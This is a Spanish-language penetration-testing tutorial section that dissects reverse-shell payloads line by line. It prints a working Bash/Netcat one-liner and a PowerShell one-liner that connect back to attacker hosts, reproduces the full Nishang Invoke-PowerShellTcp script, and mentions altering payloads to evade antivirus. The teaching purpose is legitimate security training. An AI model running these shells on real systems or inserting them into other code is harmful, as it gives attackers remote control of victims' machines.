# Payloads

La mayoría de nosotros probablemente hemos enviado un correo electrónico o un mensaje de texto. El mensaje que enviamos es el "payload" (carga útil) del paquete que se envía a través de Internet. En informática, el payload es el mensaje intencionado. En seguridad de la información, el payload es el comando y/o código que explota una vulnerabilidad en el sistema operativo o la aplicación. El payload realiza la acción maliciosa desde una perspectiva defensiva.

Como vimos en la sección de conchas inversas, Windows Defender detuvo la ejecución de nuestro payload de PowerShell porque fue considerado código malicioso.

Es importante recordar que cuando entregamos y ejecutamos payloads, simplemente estamos dando instrucciones al ordenador objetivo sobre lo que debe hacer, al igual que cualquier otro programa. Los términos "malware" y "código malicioso" a menudo hacen que el proceso parezca más misterioso de lo que es. Siempre que trabajemos con payloads, debemos desafiarnos a comprender lo que realmente hacen los comandos y el código.

A continuación, desglosaremos los "one-liners" que usamos anteriormente:

## Examinando los One-Liners

### **One-Liner de Shell Inversa con Netcat/Bash**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Los comandos anteriores constituyen un one-liner común utilizado en un sistema Linux para servir una shell Bash en un socket de red utilizando un listener de Netcat. Se usa frecuentemente, pero no siempre se entiende bien. Vamos a desglosarlo:

### **1. Eliminar `/tmp/f`**

```bash
rm -f /tmp/f;
```

Este comando elimina el archivo `/tmp/f` si existe. El modificador `-f` obliga a `rm` a ignorar archivos inexistentes sin mostrar errores. El punto y coma (;) se usa para ejecutar el comando de forma secuencial.

### **2. Crear un Pipe Nombrado**

```bash
mkfifo /tmp/f;
```

Este comando crea un archivo de pipe FIFO (first in, first out) con nombre en la ubicación especificada, en este caso, `/tmp/f`. El punto y coma (;) ejecuta el siguiente comando secuencialmente.

### **3. Redirección de Salida**

```bash
cat /tmp/f |
```

Concatena el archivo de pipe FIFO `/tmp/f`. La tubería (|) conecta la salida estándar de `cat /tmp/f` con la entrada estándar del comando que viene después de la tubería.

### **4. Establecer Opciones del Shell**

```bash
/bin/bash -i 2>&1 |
```

Especifica el intérprete de comandos, usando la opción `-i` para asegurar que la shell sea interactiva. `2>&1` redirige el flujo de datos de error estándar (2) y el flujo de datos de salida estándar (1) al comando que sigue después de la tubería.

**5. Abrir una Conexión con Netcat**

```bash
nc 10.10.14.12 7777 > /tmp/f
```

Usa Netcat para enviar una conexión a nuestro host de ataque en `10.10.14.12` que escucha en el puerto `7777`. La salida será redirigida (`>`) a `/tmp/f`, sirviendo la shell Bash a nuestro listener de Netcat cuando se ejecute el comando de shell inversa.

## PowerShell One-liner Explicado

Los shells y payloads que elegimos usar dependen en gran medida del sistema operativo (OS) que estamos atacando. Debemos tener esto en cuenta a lo largo del módulo. Vimos esto en la sección de shells inversas al establecer una shell inversa con un sistema Windows usando PowerShell. Vamos a desglosar el one-liner que usamos:

### **One-liner de PowerShell**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Desglosaremos este gran comando de PowerShell. Puede parecer mucho, pero intentemos desmitificarlo.´

### **Ejecutando PowerShell**

```powershell
powershell -nop -c 
```

Ejecuta `powershell.exe` sin perfil (`nop`) y ejecuta el bloque de comandos o script contenido en las comillas (-c). Este comando en particular se emite dentro del símbolo del sistema (cmd.exe), por lo que PowerShell está al principio del comando. Es útil saber cómo hacer esto si encontramos una vulnerabilidad de ejecución remota de código (RCE) que nos permita ejecutar comandos directamente en `cmd.exe`.

### **Vinculando un Socket**

```powershell
"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```

Establece la variable `$client` igual a (`=`) el cmdlet `New-Object`, que crea una instancia del objeto `.NET` `System.Net.Sockets.TCPClient`. Este objeto se conectará con el socket TCP en la dirección `10.10.14.158` y el puerto `443`. El punto y coma (;) asegura que los comandos y el código se ejecuten secuencialmente.

### **Estableciendo el Stream de Comandos**

```powershell
$stream = $client.GetStream();
```

Establece la variable `$stream` igual a `$client` y utiliza el método `.NET` `GetStream`, que facilita las comunicaciones de red. El punto y coma (;) asegura que los comandos y el código se ejecuten secuencialmente.

### **Stream de Bytes Vacíos**

```powershell
[byte[]]$bytes = 0..65535|%{0};
```

Crea un array de tipo byte (`[byte[]]`) llamado `$bytes` que devuelve 65,535 ceros como valores en el array. Básicamente, es un flujo de bytes vacío que se dirigirá al listener TCP que espera una conexión en el equipo de ataque.

### **Parámetros del Stream**

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Inicia un bucle `while` que contiene la variable `$i` igual a (`=`) el método `.NET` `Stream.Read`. Los parámetros: el buffer (`$bytes`), el desplazamiento (`0`) y la cuenta (`$bytes.Length`) están definidos dentro de los paréntesis del método.

### **Definiendo la Codificación de Bytes**

```powershell
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Establece la variable `$data` igual a una clase de codificación ASCII de `.NET`, utilizada junto con el método `GetString` para codificar el stream de bytes (`$bytes`) en texto ASCII. Esto asegura que lo que escribamos no se transmita como bits vacíos, sino codificado en texto ASCII. El punto y coma (;) asegura la ejecución secuencial de los comandos.

**Invoke-Expression**

```powershell
$sendback = (iex $data 2>&1 | Out-String );
```

Establece la variable `$sendback` igual a (`=`) el cmdlet `Invoke-Expression` (`iex`) que ejecuta el contenido de `$data`, luego redirige el error estándar (2>) y la salida estándar (1) a través de una tubería (|) hacia el cmdlet `Out-String`, que convierte objetos de entrada en cadenas de texto. Como se utiliza `Invoke-Expression`, todo lo almacenado en `$data` se ejecutará en el equipo local.

### **Mostrar el Directorio de Trabajo**

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```

Establece la variable `$sendback2` igual a (`=`) el valor de `$sendback` más la cadena `'PS '` más la ruta al directorio de trabajo actual (`(pwd).Path`) más `'>'`. Esto mostrará el prompt de la shell, por ejemplo, `PS C:\directoriodeTrabajo>`.

### **Establecer Sendbyte**

```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Establece la variable `$sendbyte` igual a (`=`) el stream de bytes codificado en ASCII, que será enviado usando el cliente TCP para iniciar una sesión de PowerShell con un listener de Netcat ejecutándose en la máquina de ataque.

### **Cerrar la Conexión TCP**

```powershell
$client.Close()"
```

Este es el método `TcpClient.Close`, utilizado cuando se cierra la conexión.

Este one-liner que acabamos de examinar también se puede ejecutar como un script de PowerShell (`.ps1`). Podemos ver un ejemplo de esto en el código fuente a continuación, que forma parte del proyecto **nishang**:

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
```

## Los Payloads Toman Diferentes Formas

Comprender qué están haciendo los diferentes tipos de payloads puede ayudarnos a entender por qué el antivirus (AV) los bloquea y darnos una idea de qué cambios podríamos necesitar para evitar las restricciones. Esto es algo que exploraremos más adelante en este módulo.

Algunos payloads no son one-liners y no se implementan manualmente como los que estudiamos en esta sección. Algunos se generan usando frameworks de ataque automatizados, como el poderoso **Metasploit**, que exploraremos en la próxima sección.
